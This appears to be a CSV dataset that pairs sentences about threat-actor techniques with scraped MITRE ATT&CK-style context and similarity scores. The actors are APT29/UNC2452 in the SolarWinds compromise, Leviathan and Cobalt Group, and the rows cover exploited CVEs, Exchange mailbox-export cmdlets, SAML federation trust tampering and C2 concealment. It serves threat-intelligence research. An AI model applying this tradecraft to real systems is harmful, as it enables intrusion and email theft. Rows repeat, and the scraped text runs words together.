apt29 has created self-signed digital certificates to enable mutual tls authentication for malware.,"[3][30][20][27]for thesolarwinds compromise,apt29used numerous pieces of malware that were likely developed for or by the group, includingsunburst,sunspot,raindrop, andteardrop. [9][11][37]foroperation ghost,apt29used new strains of malware includingfatduke,miniduke,regduke, andpolyglotduke.",[23].003develop capabilities:digital certificatesapt29has created self-signed digital certificates to enable mutual tls authentication for malware.,"[25][26]enterpriset1484.002domain or tenant policy modification:trust modificationduring thesolarwinds compromise,apt29changed domain federation trust settings using azure ad administrative permissions to configure the domain to accept authorization tokens signed by their own saml signing certificate. [15][44]enterpriset1482domain trust discoveryduring thesolarwinds compromise,apt29used theget-accepteddomainpowershell cmdlet to enumerate accepted domains through an exchange management shell.",66f575693063d2948570084d,1914,0.7316488554355869
they also used adfind to enumerate domains and to discover trust between federated domains.,"[25][26]enterpriset1484.002domain or tenant policy modification:trust modificationduring thesolarwinds compromise,apt29changed domain federation trust settings using azure ad administrative permissions to configure the domain to accept authorization tokens signed by their own saml signing certificate. [15][44]enterpriset1482domain trust discoveryduring thesolarwinds compromise,apt29used theget-accepteddomainpowershell cmdlet to enumerate accepted domains through an exchange management shell.",[12]they also usedadfindto enumerate domains and to discover trust between federated domains.,"[18][37]enterpriset1568dynamic resolutionapt29has used dynamic dns providers for their malware c2 infrastructure. [27]during thesolarwinds compromise,apt29used dynamic dns resolution to construct and resolve to randomly-generated subdomains for c2.",66f575693063d2948570084d,1917,0.77847793252917
unc2452 changed domain federation trust settings using azure ad administrative permissions to configure the domain to accept authorization tokens signed by their own saml signing certificate.,"[9][11][37]foroperation ghost,apt29used new strains of malware includingfatduke,miniduke,regduke, andpolyglotduke. [23].003develop capabilities:digital certificatesapt29has created self-signed digital certificates to enable mutual tls authentication for malware.","[25][26]enterpriset1484.002domain or tenant policy modification:trust modificationduring thesolarwinds compromise,apt29changed domain federation trust settings using azure ad administrative permissions to configure the domain to accept authorization tokens signed by their own saml signing certificate.","[15][44]enterpriset1482domain trust discoveryduring thesolarwinds compromise,apt29used theget-accepteddomainpowershell cmdlet to enumerate accepted domains through an exchange management shell. [12]they also usedadfindto enumerate domains and to discover trust between federated domains.",66f575693063d2948570084d,1915,0.7065741932348489
apt29 changed domain federation trust settings using azure ad administrative permissions to configure the domain to accept authorization tokens signed by their own saml signing certificate.,"[9][11][37]foroperation ghost,apt29used new strains of malware includingfatduke,miniduke,regduke, andpolyglotduke. [23].003develop capabilities:digital certificatesapt29has created self-signed digital certificates to enable mutual tls authentication for malware.","[25][26]enterpriset1484.002domain or tenant policy modification:trust modificationduring thesolarwinds compromise,apt29changed domain federation trust settings using azure ad administrative permissions to configure the domain to accept authorization tokens signed by their own saml signing certificate.","[15][44]enterpriset1482domain trust discoveryduring thesolarwinds compromise,apt29used theget-accepteddomainpowershell cmdlet to enumerate accepted domains through an exchange management shell. [12]they also usedadfindto enumerate domains and to discover trust between federated domains.",66f575693063d2948570084d,1915,0.7084793549073325
unc2452 used dynamic dns resolution to construct and resolve to randomly-generated subdomains for c2.,[12]they also usedadfindto enumerate domains and to discover trust between federated domains. [18][37]enterpriset1568dynamic resolutionapt29has used dynamic dns providers for their malware c2 infrastructure.,"[27]during thesolarwinds compromise,apt29used dynamic dns resolution to construct and resolve to randomly-generated subdomains for c2.","[12]enterpriset1114.002email collection:remote email collectionapt29has collected emails from targeted mailboxes within a compromised azure ad tenant and compromised exchange servers, including via exchange web services (ews) api requests. [33][27]during thesolarwinds compromise,apt29collected emails from specific individuals, such as executives and it staff, usingnew-mailboxexportrequestfollowed byget-mailboxexportrequest.",66f575693063d2948570084d,1919,0.7904849744153504
apt29 used dynamic dns resolution to construct and resolve to randomly-generated subdomains for c2.,[12]they also usedadfindto enumerate domains and to discover trust between federated domains. [18][37]enterpriset1568dynamic resolutionapt29has used dynamic dns providers for their malware c2 infrastructure.,"[27]during thesolarwinds compromise,apt29used dynamic dns resolution to construct and resolve to randomly-generated subdomains for c2.","[12]enterpriset1114.002email collection:remote email collectionapt29has collected emails from targeted mailboxes within a compromised azure ad tenant and compromised exchange servers, including via exchange web services (ews) api requests. [33][27]during thesolarwinds compromise,apt29collected emails from specific individuals, such as executives and it staff, usingnew-mailboxexportrequestfollowed byget-mailboxexportrequest.",66f575693063d2948570084d,1919,0.7946726607381028
"unc2452 added their own devices as allowed ids for active sync using set-casmailbox, allowing it to obtain copies of victim mailboxes.","[31]enterpriset1098.001account manipulation:additional cloud credentialsduring thesolarwinds compromise,apt29added credentials to oauth applications and service principals. [32][18].002account manipulation:additional email delegate permissionsapt29has used a compromised global administrator account in azure ad to backdoor a service principal withapplicationimpersonationrights to start collecting emails from targeted mailboxes;apt29has also used compromised accounts holdingapplicationimpersonationrights in exchange to collect emails.","[33][27]during thesolarwinds compromise,apt29added their own devices as allowed ids for active sync usingset-casmailbox, allowing it to obtain copies of victim mailboxes.","it also added additional permissions (such as mail.read and mail.readwrite) to compromised application or service principals. [12][32][31].003account manipulation:additional cloud rolesduring thesolarwinds compromise,apt29grantedcompany administratorprivileges to a newly created service principle.",66f575693063d2948570084d,1876,0.7159351353548244
"apt29 added their own devices as allowed ids for active sync using set-casmailbox, allowing it to obtain copies of victim mailboxes.","[31]enterpriset1098.001account manipulation:additional cloud credentialsduring thesolarwinds compromise,apt29added credentials to oauth applications and service principals. [32][18].002account manipulation:additional email delegate permissionsapt29has used a compromised global administrator account in azure ad to backdoor a service principal withapplicationimpersonationrights to start collecting emails from targeted mailboxes;apt29has also used compromised accounts holdingapplicationimpersonationrights in exchange to collect emails.","[33][27]during thesolarwinds compromise,apt29added their own devices as allowed ids for active sync usingset-casmailbox, allowing it to obtain copies of victim mailboxes.","it also added additional permissions (such as mail.read and mail.readwrite) to compromised application or service principals. [12][32][31].003account manipulation:additional cloud rolesduring thesolarwinds compromise,apt29grantedcompany administratorprivileges to a newly created service principle.",66f575693063d2948570084d,1876,0.7185072963873144
"apt29 has exploited cve-2019-19781 for citrix, cve-2019-11510 for pulse secure vpns, cve-2018-13379 for fortigate vpns, and cve-2019-9670 in zimbra software to gain access.","[23].008event triggered execution:accessibility featuresapt29used sticky-keys to obtain unauthenticated, privileged console access. [30][45]enterpriset1048.002exfiltration over alternative protocol:exfiltration over asymmetric encrypted non-c2 protocolduring thesolarwinds compromise,apt29exfiltrated collected data over a simple https request to a password-protected archive staged on a victim's owa servers.","[12]enterpriset1190exploit public-facing applicationapt29has exploited cve-2019-19781 for citrix, cve-2019-11510 for pulse secure vpns, cve-2018-13379 for fortigate vpns, and cve-2019-9670 in zimbra software to gain access.","[13][24]during thesolarwinds compromise,apt29exploited cve-2020-0688 against the microsoft exchange control panel to regain access to a network. [12][13]enterpriset1203exploitation for client executionapt29has used multiple software exploits for common client software, like microsoft word, exchange, and adobe reader, to gain code execution.",66f575693063d2948570084d,1929,0.9227062532446678
they have also exploited cve-2020-0688 against the microsoft exchange control panel to regain access to a network.,"[30][45]enterpriset1048.002exfiltration over alternative protocol:exfiltration over asymmetric encrypted non-c2 protocolduring thesolarwinds compromise,apt29exfiltrated collected data over a simple https request to a password-protected archive staged on a victim's owa servers. [12]enterpriset1190exploit public-facing applicationapt29has exploited cve-2019-19781 for citrix, cve-2019-11510 for pulse secure vpns, cve-2018-13379 for fortigate vpns, and cve-2019-9670 in zimbra software to gain access.","[13][24]during thesolarwinds compromise,apt29exploited cve-2020-0688 against the microsoft exchange control panel to regain access to a network.","[12][13]enterpriset1203exploitation for client executionapt29has used multiple software exploits for common client software, like microsoft word, exchange, and adobe reader, to gain code execution. [3][13][19]enterpriset1068exploitation for privilege escalationapt29has exploited cve-2021-36934 to escalate privileges on a compromised host.",66f575693063d2948570084d,1930,0.7041341230660975
unc2452 exploited cve-2020-0688 against the microsoft exchange control panel to regain access to a network.,"[30][45]enterpriset1048.002exfiltration over alternative protocol:exfiltration over asymmetric encrypted non-c2 protocolduring thesolarwinds compromise,apt29exfiltrated collected data over a simple https request to a password-protected archive staged on a victim's owa servers. [12]enterpriset1190exploit public-facing applicationapt29has exploited cve-2019-19781 for citrix, cve-2019-11510 for pulse secure vpns, cve-2018-13379 for fortigate vpns, and cve-2019-9670 in zimbra software to gain access.","[13][24]during thesolarwinds compromise,apt29exploited cve-2020-0688 against the microsoft exchange control panel to regain access to a network.","[12][13]enterpriset1203exploitation for client executionapt29has used multiple software exploits for common client software, like microsoft word, exchange, and adobe reader, to gain code execution. [3][13][19]enterpriset1068exploitation for privilege escalationapt29has exploited cve-2021-36934 to escalate privileges on a compromised host.",66f575693063d2948570084d,1930,0.7094716561951866
"apt29 has used multiple software exploits for common client software, like microsoft word, exchange, and adobe reader, to gain code execution.","[12]enterpriset1190exploit public-facing applicationapt29has exploited cve-2019-19781 for citrix, cve-2019-11510 for pulse secure vpns, cve-2018-13379 for fortigate vpns, and cve-2019-9670 in zimbra software to gain access. [13][24]during thesolarwinds compromise,apt29exploited cve-2020-0688 against the microsoft exchange control panel to regain access to a network.","[12][13]enterpriset1203exploitation for client executionapt29has used multiple software exploits for common client software, like microsoft word, exchange, and adobe reader, to gain code execution.",[3][13][19]enterpriset1068exploitation for privilege escalationapt29has exploited cve-2021-36934 to escalate privileges on a compromised host. [39]enterpriset1133external remote servicesapt29has used compromised identities to access networks via vpns and citrix.,66f575693063d2948570084d,1931,0.7698451039526727
unc2452 has used goldfinder to perform http get requests to check internet connectivity and identify http proxy servers and other redirectors that an http request travels through.,"[32][37]enterpriset1082system information discoveryduring thesolarwinds compromise,apt29usedfsutilto check available free space before executing actions that might create large files on disk. [37]enterpriset1016.001system network configuration discovery:internet connection discoveryapt29has ensured web servers in a victim environment are internet accessible before copying tools or malware to it.","[27]during thesolarwinds compromise,apt29usedgoldfinderto perform http get requests to check internet connectivity and identify http proxy servers and other redirectors that an http request travels through.","[10]enterpriset1199trusted relationshipapt29has compromised it, cloud services, and managed services providers to gain broad access to multiple customers for subsequent operations. [31]during thesolarwinds compromise,apt29gained access through compromised accounts at cloud solution partners, and used compromised certificates issued by mimecast to authenticate to mimecast customer systems.",66f575693063d2948570084d,1995,0.8003973361328763
apt29 has used goldfinder to perform http get requests to check internet connectivity and identify http proxy servers and other redirectors that an http request travels through.,"[32][37]enterpriset1082system information discoveryduring thesolarwinds compromise,apt29usedfsutilto check available free space before executing actions that might create large files on disk. [37]enterpriset1016.001system network configuration discovery:internet connection discoveryapt29has ensured web servers in a victim environment are internet accessible before copying tools or malware to it.","[27]during thesolarwinds compromise,apt29usedgoldfinderto perform http get requests to check internet connectivity and identify http proxy servers and other redirectors that an http request travels through.","[10]enterpriset1199trusted relationshipapt29has compromised it, cloud services, and managed services providers to gain broad access to multiple customers for subsequent operations. [31]during thesolarwinds compromise,apt29gained access through compromised accounts at cloud solution partners, and used compromised certificates issued by mimecast to authenticate to mimecast customer systems.",66f575693063d2948570084d,1995,0.8027290993063555
"apt29 has used various forms of spearphishing attempting to get a user to open attachments, including, but not limited to, malicious microsoft word documents, .pdf, and .lnk files.","[30].004use alternate authentication material:web session cookieduring thesolarwinds compromise,apt29used stolen cookies to access cloud resources and a forgedduo-sidcookie to bypass mfa set on an email account. [12][18]enterpriset1204.001user execution:malicious linkapt29has used various forms of spearphishing attempting to get a user to click on a malicous link.","[19][48].002user execution:malicious fileapt29has used various forms of spearphishing attempting to get a user to open attachments, including, but not limited to, malicious microsoft word documents, .pdf, and .lnk files.","[3][39][16]enterpriset1078valid accountsapt29has used a compromised account to access an organization's vpn infrastructure. [33]during thesolarwinds compromise,apt29used different compromised credentials for remote access and to move laterally.",66f575693063d2948570084d,2003,0.7680971271152521
unc2452 set the hostnames of its c2 infrastructure to match legitimate hostnames in the victim environment.,"[32][15]enterpriset1589.001gather victim identity information:credentialsfor thesolarwinds compromise,apt29conducted credential theft operations to obtain credentials to be used for access to victim environments. [18]enterpriset1665hide infrastructureapt29uses compromised residential endpoints, typically within the same isp ip address range, as proxies to hide the true source of c2 traffic.","[34]during thesolarwinds compromise,apt29set the hostnames of their c2 infrastructure to match legitimate hostnames in the victim environment.","they also used ip addresses originating from the same country as the victim for their vpn infrastructure. [9]enterpriset1562.001impair defenses:disable or modify toolsduring thesolarwinds compromise,apt29used the service control manager on a remote system to disable services associated with security monitoring products.",66f575693063d2948570084d,1940,0.7270344089695573
they also primarily used ip addresses originating from the same country as the victim for their vpn infrastructure.,"[18]enterpriset1665hide infrastructureapt29uses compromised residential endpoints, typically within the same isp ip address range, as proxies to hide the true source of c2 traffic. [34]during thesolarwinds compromise,apt29set the hostnames of their c2 infrastructure to match legitimate hostnames in the victim environment.",they also used ip addresses originating from the same country as the victim for their vpn infrastructure.,"[9]enterpriset1562.001impair defenses:disable or modify toolsduring thesolarwinds compromise,apt29used the service control manager on a remote system to disable services associated with security monitoring products. [37].002impair defenses:disable windows event loggingduring thesolarwinds compromise,apt29, usedauditpolto prevent the collection of audit logs.",66f575693063d2948570084d,1941,0.9350623559583905
apt29 has set the hostnames of its c2 infrastructure to match legitimate hostnames in the victim environment.,"[32][15]enterpriset1589.001gather victim identity information:credentialsfor thesolarwinds compromise,apt29conducted credential theft operations to obtain credentials to be used for access to victim environments. [18]enterpriset1665hide infrastructureapt29uses compromised residential endpoints, typically within the same isp ip address range, as proxies to hide the true source of c2 traffic.","[34]during thesolarwinds compromise,apt29set the hostnames of their c2 infrastructure to match legitimate hostnames in the victim environment.","they also used ip addresses originating from the same country as the victim for their vpn infrastructure. [9]enterpriset1562.001impair defenses:disable or modify toolsduring thesolarwinds compromise,apt29used the service control manager on a remote system to disable services associated with security monitoring products.",66f575693063d2948570084d,1940,0.7270422023814211
they have also used ip addresses originating from the same country as the victim for their vpn infrastructure.,"[18]enterpriset1665hide infrastructureapt29uses compromised residential endpoints, typically within the same isp ip address range, as proxies to hide the true source of c2 traffic. [34]during thesolarwinds compromise,apt29set the hostnames of their c2 infrastructure to match legitimate hostnames in the victim environment.",they also used ip addresses originating from the same country as the victim for their vpn infrastructure.,"[9]enterpriset1562.001impair defenses:disable or modify toolsduring thesolarwinds compromise,apt29used the service control manager on a remote system to disable services associated with security monitoring products. [37].002impair defenses:disable windows event loggingduring thesolarwinds compromise,apt29, usedauditpolto prevent the collection of audit logs.",66f575693063d2948570084d,1941,0.9776338165154598
they have manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration.,"[37]enterpriset1053.005scheduled task/job:scheduled taskapt29has used named and hijacked scheduled tasks to establish persistence. [30]during thesolarwinds compromise,apt29usedschedulerandschtasksto create new tasks on remote host as part of their lateral movement.",they manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration.apt29also created a scheduled task to maintainsunspotpersistence when the host booted.,"[12][9][11]enterpriset1505.003server software component:web shellapt29has installed web shells on exploited microsoft exchange servers. [13][27]enterpriset1528steal application access tokenapt29uses stolen tokens to access victim accounts, without needing a password.",66f575693063d2948570084d,1982,0.8434133446541315
they also manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration.,"[37]enterpriset1053.005scheduled task/job:scheduled taskapt29has used named and hijacked scheduled tasks to establish persistence. [30]during thesolarwinds compromise,apt29usedschedulerandschtasksto create new tasks on remote host as part of their lateral movement.",they manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration.apt29also created a scheduled task to maintainsunspotpersistence when the host booted.,"[12][9][11]enterpriset1505.003server software component:web shellapt29has installed web shells on exploited microsoft exchange servers. [13][27]enterpriset1528steal application access tokenapt29uses stolen tokens to access victim accounts, without needing a password.",66f575693063d2948570084d,1982,0.8454414834808999
apt29 has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.,"[44][37][18]enterpriset1069.002permission groups discovery:domain groupsduring thesolarwinds compromise,apt29usedadfindto enumerate domain groups. [18]enterpriset1566.001phishing:spearphishing attachmentapt29has used spearphishing emails with an attachment to deliver files with exploits to initial victims.",[3][19][39][16].002phishing:spearphishing linkapt29has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.,"[30][19][48].003phishing:spearphishing via serviceapt29has used the legitimate mailing service constant contact to send phishing e-mails. [19]enterpriset1057process discoveryduring thesolarwinds compromise,apt29used multiple command-line utilities to enumerate running processes.",66f575693063d2948570084d,1968,0.7174531864904116
apt29 has used compromised certificates issued by mimecast to authenticate to mimecast customer systems.,"[27]during thesolarwinds compromise,apt29usedgoldfinderto perform http get requests to check internet connectivity and identify http proxy servers and other redirectors that an http request travels through. [10]enterpriset1199trusted relationshipapt29has compromised it, cloud services, and managed services providers to gain broad access to multiple customers for subsequent operations.","[31]during thesolarwinds compromise,apt29gained access through compromised accounts at cloud solution partners, and used compromised certificates issued by mimecast to authenticate to mimecast customer systems.","[13][18]enterpriset1552.004unsecured credentials:private keysduring thesolarwinds compromise,apt29obtained pki keys, certificate files, and the private encryption key from an active directory federation services (ad fs) container to decrypt corresponding saml signing certificates. [44][13]enterpriset1550.001use alternate authentication material:application access tokenduring thesolarwinds compromise,apt29used compromised service principals to make changes to the office 365 environment.",66f575693063d2948570084d,1997,0.7382898891290258
apt29 changed domain federation trust settings using azure ad administrative permissions to configure the domain to accept authorization tokens signed by their own saml signing certificate.,"[9][11][37]foroperation ghost,apt29used new strains of malware includingfatduke,miniduke,regduke, andpolyglotduke. [23].003develop capabilities:digital certificatesapt29has created self-signed digital certificates to enable mutual tls authentication for malware.","[25][26]enterpriset1484.002domain or tenant policy modification:trust modificationduring thesolarwinds compromise,apt29changed domain federation trust settings using azure ad administrative permissions to configure the domain to accept authorization tokens signed by their own saml signing certificate.","[15][44]enterpriset1482domain trust discoveryduring thesolarwinds compromise,apt29used theget-accepteddomainpowershell cmdlet to enumerate accepted domains through an exchange management shell. [12]they also usedadfindto enumerate domains and to discover trust between federated domains.",66f575693063d2948570084d,1915,0.7084793549073325
"unc2452 added their own devices as allowed ids for active sync using set-casmailbox, allowing it to obtain copies of victim mailboxes.","[31]enterpriset1098.001account manipulation:additional cloud credentialsduring thesolarwinds compromise,apt29added credentials to oauth applications and service principals. [32][18].002account manipulation:additional email delegate permissionsapt29has used a compromised global administrator account in azure ad to backdoor a service principal withapplicationimpersonationrights to start collecting emails from targeted mailboxes;apt29has also used compromised accounts holdingapplicationimpersonationrights in exchange to collect emails.","[33][27]during thesolarwinds compromise,apt29added their own devices as allowed ids for active sync usingset-casmailbox, allowing it to obtain copies of victim mailboxes.","it also added additional permissions (such as mail.read and mail.readwrite) to compromised application or service principals. [12][32][31].003account manipulation:additional cloud rolesduring thesolarwinds compromise,apt29grantedcompany administratorprivileges to a newly created service principle.",66f575693063d2948570084d,1876,0.7159351353548244
unc2452 set the hostnames of its c2 infrastructure to match legitimate hostnames in the victim environment.,"[32][15]enterpriset1589.001gather victim identity information:credentialsfor thesolarwinds compromise,apt29conducted credential theft operations to obtain credentials to be used for access to victim environments. [18]enterpriset1665hide infrastructureapt29uses compromised residential endpoints, typically within the same isp ip address range, as proxies to hide the true source of c2 traffic.","[34]during thesolarwinds compromise,apt29set the hostnames of their c2 infrastructure to match legitimate hostnames in the victim environment.","they also used ip addresses originating from the same country as the victim for their vpn infrastructure. [9]enterpriset1562.001impair defenses:disable or modify toolsduring thesolarwinds compromise,apt29used the service control manager on a remote system to disable services associated with security monitoring products.",66f575693063d2948570084d,1940,0.7270344089695573
they also manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration.,"[37]enterpriset1053.005scheduled task/job:scheduled taskapt29has used named and hijacked scheduled tasks to establish persistence. [30]during thesolarwinds compromise,apt29usedschedulerandschtasksto create new tasks on remote host as part of their lateral movement.",they manipulated scheduled tasks by updating an existing legitimate task to execute their tools and then returned the scheduled task to its original configuration.apt29also created a scheduled task to maintainsunspotpersistence when the host booted.,"[12][9][11]enterpriset1505.003server software component:web shellapt29has installed web shells on exploited microsoft exchange servers. [13][27]enterpriset1528steal application access tokenapt29uses stolen tokens to access victim accounts, without needing a password.",66f575693063d2948570084d,1982,0.8454414834808999
apt29 has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.,"[44][37][18]enterpriset1069.002permission groups discovery:domain groupsduring thesolarwinds compromise,apt29usedadfindto enumerate domain groups. [18]enterpriset1566.001phishing:spearphishing attachmentapt29has used spearphishing emails with an attachment to deliver files with exploits to initial victims.",[3][19][39][16].002phishing:spearphishing linkapt29has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files.,"[30][19][48].003phishing:spearphishing via serviceapt29has used the legitimate mailing service constant contact to send phishing e-mails. [19]enterpriset1057process discoveryduring thesolarwinds compromise,apt29used multiple command-line utilities to enumerate running processes.",66f575693063d2948570084d,1968,0.7174531864904116
"adversaries may obtain and abuse credentials of a cloud account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.",the adversary is known for harvesting login credentials  [t1589.001]. [17]idnamedescriptiont1589.001gather victim identity information: credentialsadversaries may gather credentials that can be used during targeting.initial access[ta0001]initial access consists of techniques that use various entry vectors to gain their initial foothold within a network.,"for example, the adversary may obtain and abuse credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion [t1078].",[18] these specific actors obtained and abused credentials of domain [t1078.002] and cloud accounts [t1078.004]. [19] the actors also used external remote services to gain access to systems [t1133].,66f576363063d294857008c7,700,0.7892804164601137
"adversaries may obtain and abuse credentials of a cloud account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.","the adversary obtains and abuses credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion [t1078]. [24]  specifically in this case, credentials of cloud accounts [t1078.004] were obtained and abused.","[25]idnamedescriptiont1078valid accountsadversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access.t1078.004valid accounts: cloud accountsadversaries may obtain and abuse credentials of a cloud account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.defense evasion[ta0005]defense evasion consists of techniques that adversaries use to avoid detection throughout their compromise.","the adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit [t1027]. [26]idnamedescriptiont1027obfuscated files or informationadversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.credential access[ta0006]credential access consists of techniques for stealing credentials like account names and passwords.",66f576363063d294857008c7,710,0.7619995125259964
"adversaries may obtain and abuse credentials of a default account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.",the adversary is known for harvesting login credentials  [t1589.001]. [17]idnamedescriptiont1589.001gather victim identity information: credentialsadversaries may gather credentials that can be used during targeting.initial access[ta0001]initial access consists of techniques that use various entry vectors to gain their initial foothold within a network.,"for example, the adversary may obtain and abuse credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion [t1078].",[18] these specific actors obtained and abused credentials of domain [t1078.002] and cloud accounts [t1078.004]. [19] the actors also used external remote services to gain access to systems [t1133].,66f576363063d294857008c7,700,0.7854454201911666
"adversaries may obtain and abuse credentials of a default account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.","the adversary obtains and abuses credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion [t1078]. [24]  specifically in this case, credentials of cloud accounts [t1078.004] were obtained and abused.","[25]idnamedescriptiont1078valid accountsadversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access.t1078.004valid accounts: cloud accountsadversaries may obtain and abuse credentials of a cloud account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.defense evasion[ta0005]defense evasion consists of techniques that adversaries use to avoid detection throughout their compromise.","the adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit [t1027]. [26]idnamedescriptiont1027obfuscated files or informationadversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.credential access[ta0006]credential access consists of techniques for stealing credentials like account names and passwords.",66f576363063d294857008c7,710,0.7133868269511242
"adversaries may obtain and abuse credentials of a domain account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.",the adversary is known for harvesting login credentials  [t1589.001]. [17]idnamedescriptiont1589.001gather victim identity information: credentialsadversaries may gather credentials that can be used during targeting.initial access[ta0001]initial access consists of techniques that use various entry vectors to gain their initial foothold within a network.,"for example, the adversary may obtain and abuse credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion [t1078].",[18] these specific actors obtained and abused credentials of domain [t1078.002] and cloud accounts [t1078.004]. [19] the actors also used external remote services to gain access to systems [t1133].,66f576363063d294857008c7,700,0.7960788036622344
"adversaries may obtain and abuse credentials of a domain account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.","the adversary obtains and abuses credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion [t1078]. [24]  specifically in this case, credentials of cloud accounts [t1078.004] were obtained and abused.","[25]idnamedescriptiont1078valid accountsadversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access.t1078.004valid accounts: cloud accountsadversaries may obtain and abuse credentials of a cloud account as a means of gaining initial access, persistence, privilege escalation, or defense evasion.defense evasion[ta0005]defense evasion consists of techniques that adversaries use to avoid detection throughout their compromise.","the adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit [t1027]. [26]idnamedescriptiont1027obfuscated files or informationadversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.credential access[ta0006]credential access consists of techniques for stealing credentials like account names and passwords.",66f576363063d294857008c7,710,0.7230446790426587
adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in windows multi-domain/forest environments.,"[28]idnamedescriptiont1003.003os credential dumping: ntdsadversaries may attempt to access or create a copy of the active directory domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.t1110.003brute force: password sprayingadversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials.discovery consists of techniques an adversary may use to gain knowledge about the system and internal network. the adversary enumerated files and directories or searched in specific locations of a host or network share for certain information within a file system [t1083].","[29]  in addition, the adversary attempted to gather information on domain trust relationships that may be used to identify lateral movement opportunities in windows multi-domain or forest environments [t1482].","[30]idnamedescriptiont1083file and directory discoveryadversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.t1482domain trust discoveryadversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in windows multi-domain/forest environments.collection [ta0009]collection consists of both the techniques adversaries may use to gather information and the sources that information is collected from that are relevant to the adversary's objectives. the adversary leverages information repositories, such as sharepoint, to mine valuable information [t1213.002].",66f576363063d294857008c7,717,0.8020543578212245
leviathan has utilized techniques like reflective dll loading to write a dll into memory and load a shell that provides backdoor access to the victim.,"[8]enterpriset1566.001phishing:spearphishing attachmentleviathanhas sent spearphishing emails with malicious attachments, including .rtf, .doc, and .xls files. [2][1].002phishing:spearphishing linkleviathanhas sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding.",[2][1]enterpriset1055.001process injection:dynamic-link library injectionleviathanhas utilized techniques like reflective dll loading to write a dll into memory and load a shell that provides backdoor access to the victim.,[4]enterpriset1572protocol tunnelingleviathanhas used protocol tunneling to further conceal c2 communications and infrastructure. [1]enterpriset1090.003proxy:multi-hop proxyleviathanhas used multi-hop proxies to disguise the source of their malicious traffic.,66f5764a3063d294857008d9,1410,0.7102689099012994
"leviathan has exploited multiple microsoft office and .net vulnerabilities for execution, including cve-2017-0199, cve-2017-8759, and cve-2017-11882.",[3]enterpriset1041exfiltration over c2 channelleviathanhas exfiltrated data over its c2 channel. [1]enterpriset1567.002exfiltration over web service:exfiltration to cloud storageleviathanhas used an uploader known as lunchmoney that can exfiltrate files to dropbox.,"[2][3]enterpriset1203exploitation for client executionleviathanhas exploited multiple microsoft office and .net vulnerabilities for execution, including cve-2017-0199, cve-2017-8759, and cve-2017-11882.",[2][3][1][4]enterpriset1133external remote servicesleviathanhas used external remote services such as virtual private networks (vpn) to gain initial access. [1]enterpriset1589.001gather victim identity information:credentialsleviathanhas collected compromised credentials to use for targeting efforts.,66f5764a3063d294857008d9,1397,0.88931540126974
"cobalt group had exploited multiple vulnerabilities for execution, including microsoft’s equation editor , an internet explorer vulnerability , cve-2017-8570, cve-2017-0199, and cve-2017-8759.",[3]enterpriset1041exfiltration over c2 channelleviathanhas exfiltrated data over its c2 channel. [1]enterpriset1567.002exfiltration over web service:exfiltration to cloud storageleviathanhas used an uploader known as lunchmoney that can exfiltrate files to dropbox.,"[2][3]enterpriset1203exploitation for client executionleviathanhas exploited multiple microsoft office and .net vulnerabilities for execution, including cve-2017-0199, cve-2017-8759, and cve-2017-11882.",[2][3][1][4]enterpriset1133external remote servicesleviathanhas used external remote services such as virtual private networks (vpn) to gain initial access. [1]enterpriset1589.001gather victim identity information:credentialsleviathanhas collected compromised credentials to use for targeting efforts.,66f5764a3063d294857008d9,1397,0.72591539801782
"leviathan has used publicly available tools to dump password hashes, including procdump and wce.","[1].013obfuscated files or information:encrypted/encoded fileleviathanhas obfuscated code using base64 and gzip compression. [2]enterpriset1003os credential dumpingleviathanhas used publicly available tools to dump password hashes, includinghomefry.","[8].001lsass memoryleviathanhas used publicly available tools to dump password hashes, including procdump and wce.","[8]enterpriset1566.001phishing:spearphishing attachmentleviathanhas sent spearphishing emails with malicious attachments, including .rtf, .doc, and .xls files. [2][1].002phishing:spearphishing linkleviathanhas sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding.",66f5764a3063d294857008d9,1407,0.7583119676129573
